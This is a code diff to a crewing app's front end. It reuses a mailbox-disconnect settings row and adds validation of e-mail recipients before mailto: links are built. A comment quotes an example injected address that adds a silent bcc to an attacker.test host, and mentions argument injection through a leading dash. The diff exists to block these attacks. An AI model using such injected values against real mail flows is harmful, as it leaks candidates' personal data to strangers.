@@ -4894,6 +4894,26 @@ function legacyMailboxPaint() {
   if (legacyMailboxConfigured()) btn.removeAttribute('disabled');
   else btn.setAttribute('disabled', 'disabled');
 }
+// ONE row, four surfaces. Two of them are the settings screens the product
+// actually shows (`renderSettingsModal` → «Организация», `mobileSettingsOrgHtml`)
+// and two are the settings5 preview shell. The distinction is the whole point of
+// this row: the shell hides behind `skipi_crewing_settings5`, a flag the product
+// never sets, so a row that lived ONLY there could not be reached by anybody —
+// and with the module retired that would mean a connected mailbox can never be
+// revoked from the product again (Супервайзор REJECT на e05a3c4c).
+function legacyMailboxRowHtml(shape) {
+  legacyMailboxEnsureStatus();
+  var label = escapeHtml(tr('settings.mailbox_legacy'));
+  var desc = escapeHtml(tr('settings.mailbox_legacy_desc'));
+  var off = legacyMailboxConfigured() ? '' : ' disabled';
+  var status = '<span id="legacy-mailbox-status" data-qa="settings.mailbox.legacy-status">'+escapeHtml(legacyMailboxStatusText())+'</span>';
+  if (shape === 'mobile') {
+    return '<div class="mobile-setting-row" data-qa="settings.mailbox.legacy"><div class="mobile-muted"><strong style="display:block;color:var(--text);margin-bottom:3px;">'+label+'</strong>'+desc+' '+status+'</div>'
+      + '<button class="mobile-secondary" id="legacy-mailbox-disconnect" data-qa="settings.mailbox.legacy-disconnect"'+off+' onclick="openMailboxSettings()">'+escapeHtml(tr('confirm.disconnect'))+'</button></div>';
+  }
+  return '<div class="setting-row" data-qa="settings.mailbox.legacy"><div class="setting-info"><div class="setting-label">'+label+'</div><div class="setting-desc">'+desc+'</div></div>'
+    + '<div class="setting-control">'+status+' <button class="ghost" id="legacy-mailbox-disconnect" data-qa="settings.mailbox.legacy-disconnect" style="padding:5px 12px;font-size:12px;"'+off+' onclick="openMailboxSettings()">'+escapeHtml(tr('confirm.disconnect'))+'</button></div></div>';
+}
 async function legacyMailboxDisconnect() {
   var m = legacyMailboxState();
   if (!legacyMailboxConfigured()) { showToast(tr('settings.mailbox_legacy_none'), 'warn'); return; }
@@ -6110,7 +6130,7 @@ var PILOT_CARD_TEXT = {
     draft_title:'Draft e-mail', draft_to:'To', draft_subject:'Subject', draft_body:'Message', draft_profile:'Compliance profile', draft_close:'Close the draft',
     draft_open_client:'Open in the mail client', draft_copy:'Copy the text', draft_copied:'Copied: paste it into your mail app or a messenger.', draft_share:'Share the offer',
     draft_opened:'Draft opened in the mail client', draft_failed:'The mail client did not open: nothing was recorded for this candidate.', draft_copy_failed:'The text could not be copied: nothing was recorded.',
-    draft_need_contact:'There is no address on this card. Type one and it is recorded as a fact you entered.', draft_contact_save:'Save the address and continue', draft_web_note:'In the web version the browser opens your mail client.',
+    draft_to_invalid:'This address does not pass the check, so no letter is prepared from it:', draft_need_contact:'There is no address on this card. Type one and it is recorded as a fact you entered.', draft_contact_save:'Save the address and continue', draft_web_note:'In the web version the browser opens your mail client.',
     draft_hello:'Good day,', draft_intro:'{company} is writing to you.', draft_company_unknown:'our crewing desk', draft_offer:'We have an opening that may fit your documents.', draft_offer_rank:'We have an opening for {rank}.',
     draft_requirements:'What the profile states', draft_docs_ask:'Could you send the documents that are missing from your file?', draft_question:'Would you be ready to discuss it?',
     draft_subject_reply:'Position offer', draft_subject_docs:'Documents for your application',
@@ -6142,7 +6162,7 @@ var PILOT_CARD_TEXT = {
     draft_title:'Черновик письма', draft_to:'Кому', draft_subject:'Тема', draft_body:'Текст', draft_profile:'Профиль соответствия', draft_close:'Закрыть черновик',
     draft_open_client:'Открыть в почтовом клиенте', draft_copy:'Скопировать текст', draft_copied:'Скопировано — вставьте в почту или мессенджер.', draft_share:'Поделиться предложением',
     draft_opened:'Черновик открыт в почтовом клиенте', draft_failed:'Почтовый клиент не открылся — по этому кандидату ничего не записано.', draft_copy_failed:'Текст не скопировался — ничего не записано.',
-    draft_need_contact:'Адреса на карточке нет. Укажите его — он будет записан как сведения, внесённые вами.', draft_contact_save:'Сохранить адрес и продолжить', draft_web_note:'В веб-версии почтовый клиент откроет браузер.',
+    draft_to_invalid:'Этот адрес не проходит проверку, письмо по нему не готовится:', draft_need_contact:'Адреса на карточке нет. Укажите его — он будет записан как сведения, внесённые вами.', draft_contact_save:'Сохранить адрес и продолжить', draft_web_note:'В веб-версии почтовый клиент откроет браузер.',
     draft_hello:'Здравствуйте!', draft_intro:'Пишет {company}.', draft_company_unknown:'наша крюинговая компания', draft_offer:'У нас есть предложение, которое может подойти по вашим документам.', draft_offer_rank:'У нас есть предложение на позицию {rank}.',
     draft_requirements:'Что указано в профиле', draft_docs_ask:'Пришлите, пожалуйста, документы, которых не хватает в вашем деле.', draft_question:'Готовы обсудить?',
     draft_subject_reply:'Предложение по позиции', draft_subject_docs:'Документы по вашей заявке',
@@ -6538,6 +6558,28 @@ function cardFieldLabel(field) {
   var label = cardT(key);
   return label === key ? String(field) : String(field) + ' · ' + label;
 }
+// The SAME strict form as `contact.rs checked_recipient`, because the web shell
+// never reaches Rust: there the address goes straight into a `mailto:` URL the
+// browser hands to a mail client, and `oleh@example.test?bcc=silent@attacker.test`
+// would add a silent recipient built out of a stranger's CV (Супервайзор,
+// e05a3c4c). A leading `-` is refused on both sides too: `xdg-email` reads such
+// an argument as a flag and fails, and "draft opened" would then be written for a
+// draft nobody ever saw. Returns the address, or null — never a "cleaned" one.
+function cardCheckedRecipient(value) {
+  var to = String(value == null ? '' : value).trim();
+  if (!to || to.length > 254) return null;
+  if (to.charAt(0) === '-') return null;
+  if (/[%?&,'"<>\s\u0000-\u001f\u007f-\uffff]/.test(to)) return null;
+  var parts = to.split('@');
+  if (parts.length !== 2) return null;
+  if (!/^[A-Za-z0-9._+-]+$/.test(parts[0])) return null;
+  var labels = parts[1].split('.');
+  if (labels.length < 2) return null;
+  for (var i = 0; i < labels.length; i++) {
+    if (!/^[A-Za-z0-9-]+$/.test(labels[i])) return null;
+  }
+  return to;
+}
 function cardWebShell() {
   try { return (typeof window !== 'undefined') && window.__SKIPI_WEB_SHELL__ === true; }
   catch (e) { return false; }
@@ -6867,6 +6909,10 @@ async function pilotDraftOpenClient() {
   var d = pilotDetail(), token = pilotDetailToken();
   if (!d || !d.draft || d.draft.pending) return;
   if (!d.draft.to) { d.draft.needContact = true; renderIntakePilot(); return; }
+  // A refused address marks nothing and opens nothing — the same rule as a
+  // refused client. Rust would refuse it too; the screen must not claim
+  // otherwise in the meantime.
+  if (!cardCheckedRecipient(d.draft.to)) { showToast(cardT('draft_to_invalid'), 'error'); renderIntakePilot(); return; }
   if (cardWebShell()) return;
   d.draft.pending = true; renderIntakePilot();
   try {
@@ -6922,8 +6968,11 @@ function pilotDraftHtml() {
       + '<button data-qa="pilot-draft-contact-save" onclick="pilotDraftContactSave()" '+(d.pending?'disabled':'')+'>'+escapeHtml(cardT('draft_contact_save'))+'</button></div>'
     : '<div class="pilot-note" data-qa="pilot-draft-to">'+escapeHtml(cardT('draft_to'))+': '+escapeHtml(dr.to)
       + (dr.legacy ? ' <span class="pilot-state paused" data-qa="pilot-draft-legacy">'+escapeHtml(cardT('contact_legacy'))+'</span>' : '')+'</div>';
-  var leave = web
-    ? '<a class="ghost" data-qa="pilot-draft-mailto" href="'+escapeAttr('mailto:'+dr.to+'?subject='+encodeURIComponent(dr.subject)+'&body='+encodeURIComponent(dr.body))+'">'+escapeHtml(cardT('draft_open_client'))+'</a>'
+  var checkedTo = cardCheckedRecipient(dr.to);
+  var leave = (!dr.needContact && !checkedTo)
+    ? '<div class="pilot-status error" data-qa="pilot-draft-to-invalid">'+escapeHtml(cardT('draft_to_invalid'))+' '+escapeHtml(String(dr.to))+'</div>'
+    : web
+    ? '<a class="ghost" data-qa="pilot-draft-mailto" href="'+escapeAttr('mailto:'+checkedTo+'?subject='+encodeURIComponent(dr.subject)+'&body='+encodeURIComponent(dr.body))+'">'+escapeHtml(cardT('draft_open_client'))+'</a>'
       + '<span class="pilot-note" data-qa="pilot-draft-web-note">'+escapeHtml(cardT('draft_web_note'))+'</span>'
     : (mobile
       ? '<button data-qa="pilot-draft-copy" onclick="pilotDraftCopy()">'+escapeHtml(cardT('draft_share'))+'</button>'
@@ -10815,6 +10864,7 @@ function renderSettingsModal() {
           settingRow('Название организации', 'Отображается в рабочем пространстве Crewing. На сервер не отправляется.', inputCtrl('s-company', s.company_name, 'text', 'например, Marlow Crewing Ltd', '240px'))
         + settingRow('Контактный email', 'Для переписки по верификации и связи с организацией.', inputCtrl('p-email', p.contact_email, 'text', 'hr@company.com', '240px'))
         + settingRow('Контактный телефон', 'Необязательно. Используется на профилях после company_verified.', inputCtrl('p-phone', p.contact_phone, 'text', '+357 ...', '180px'))
+        + legacyMailboxRowHtml('desktop')
         )
       + sectionTitle('Данные для верификации')
       + grp(
@@ -10977,7 +11027,6 @@ function renderSettingsFiveShell() {
   var body = '';
 
   if (section === 'modules') {
-    legacyMailboxEnsureStatus();
     body = '<div class="settings-section" data-qa="settings5-shell settings.modules.body">'
       + mainHeader('Modules / Apps', 'Built-in and community modules live here. Module internals stay inside the module.', 'Top-level', 'settings.modules.header')
       + previewGrid([
@@ -10991,7 +11040,7 @@ function renderSettingsFiveShell() {
         )
       + nestedTitle('Sources / Connections', 'settings.modules.sources')
       + grp(
-          '<div class="setting-row" data-qa="settings.mailbox.legacy"><div class="setting-info"><div class="setting-label">'+escapeHtml(tr('settings.mailbox_legacy'))+'</div><div class="setting-desc">'+escapeHtml(tr('settings.mailbox_legacy_desc'))+'</div></div><div class="setting-control"><span id="legacy-mailbox-status" data-qa="settings.mailbox.legacy-status">'+escapeHtml(legacyMailboxStatusText())+'</span> <button class="ghost" id="legacy-mailbox-disconnect" data-qa="settings.mailbox.legacy-disconnect" style="padding:5px 12px;font-size:12px;"'+(legacyMailboxConfigured()?'':' disabled')+' onclick="openMailboxSettings()">'+escapeHtml(tr('confirm.disconnect'))+'</button></div></div>'
+          legacyMailboxRowHtml('desktop')
         + settingRow('Email для ответов', 'Источник ответов моряков на вакансии. Если пусто — используется контактный email организации.', inputCtrl('s-reply', s.reply_to, 'text', 'hr@company.com', '240px'))
         + '<div class="setting-row"><div class="setting-info"><div class="setting-label">VSL DB source</div><div class="setting-desc">Source, permissions and local cache policy for the vessel database module. Demo-only until the module is accepted.</div></div><div class="setting-control"><span data-qa="settings.modules.sources.vsl">'+staticSwitch(false)+' source not linked</span></div></div>'
         + settingRow('Module source', 'Built-in / Community source selection lives under Modules, not as a separate top-level page.', selectCtrl('settings-mod-source', 'built-in', [['built-in','Built-in'],['community','Community (preview)', true]]))
@@ -12476,6 +12525,7 @@ function mobileSettingsOrgHtml() {
     + '<div class="mobile-card">'
     + '<div class="mobile-row full"><div class="mobile-field"><label>Название организации</label><input id="m-company" type="text" value="'+escapeAttr(s.company_name||'')+'" placeholder="например, Marlow Crewing Ltd"></div></div>'
     + '<div class="mobile-setting-row"><div class="mobile-muted"><strong style="display:block;color:var(--text);margin-bottom:3px;">'+escapeHtml(mobileTr('work_role'))+'</strong>'+escapeHtml(mobileWorkRoleLabel(role))+'</div><button class="mobile-secondary" onclick="mobileChangeWorkRole()">'+escapeHtml(mobileTr('change_role'))+'</button></div>'
+    + legacyMailboxRowHtml('mobile')
     + '<div class="mobile-actions" style="margin-top:4px;"><button class="mobile-primary" onclick="mobileSaveConnection(true)">'+escapeHtml(mobileTr('save'))+'</button></div>'
     + '</div>';
 }
@@ -12553,7 +12603,6 @@ function mobileSettingsAppHtml() {
 
 function mobileSettingsFiveModulesHtml() {
   var s = state.settings || {};
-  legacyMailboxEnsureStatus();
   return mobileSettingsHead('Modules / Apps', 'Installed modules and sources live here. Work content stays in home modules.')
     + '<div class="mobile-card" data-qa="settings.modules.root">'
     + '<div class="mobile-section-title" style="margin-top:0;">Installed modules</div>'
@@ -12564,7 +12613,7 @@ function mobileSettingsFiveModulesHtml() {
     + '</div>'
     + '<div class="mobile-card" data-qa="settings.modules.sources">'
     + '<div class="mobile-section-title" style="margin-top:0;">Sources / Connections</div>'
-    + '<div class="mobile-setting-row" data-qa="settings.mailbox.legacy" style="border-top:0;padding-top:0;"><div class="mobile-muted"><strong style="display:block;color:var(--text);margin-bottom:3px;">'+escapeHtml(tr('settings.mailbox_legacy'))+'</strong>'+escapeHtml(tr('settings.mailbox_legacy_desc'))+' <span id="legacy-mailbox-status" data-qa="settings.mailbox.legacy-status">'+escapeHtml(legacyMailboxStatusText())+'</span></div><button class="mobile-secondary" id="legacy-mailbox-disconnect" data-qa="settings.mailbox.legacy-disconnect"'+(legacyMailboxConfigured()?'':' disabled')+' onclick="openMailboxSettings()">'+escapeHtml(tr('confirm.disconnect'))+'</button></div>'
+    + legacyMailboxRowHtml('mobile')
     + '<div class="mobile-setting-row"><div class="mobile-muted"><strong style="display:block;color:var(--text);margin-bottom:3px;">VSL DB source</strong>Source, permissions and local cache policy are demo-only until the module is accepted.</div><span class="mobile-status warn">not linked</span></div>'
     + '<div class="mobile-row full"><div class="mobile-field"><label>Email для ответов</label><input id="m-reply" type="email" value="'+escapeAttr(s.reply_to||'')+'" placeholder="hr@company.com"></div></div>'
     + '<div class="mobile-actions" style="margin-top:4px;"><button class="mobile-primary" onclick="mobileSaveConnection(true)">'+escapeHtml(mobileTr('save'))+'</button></div>'
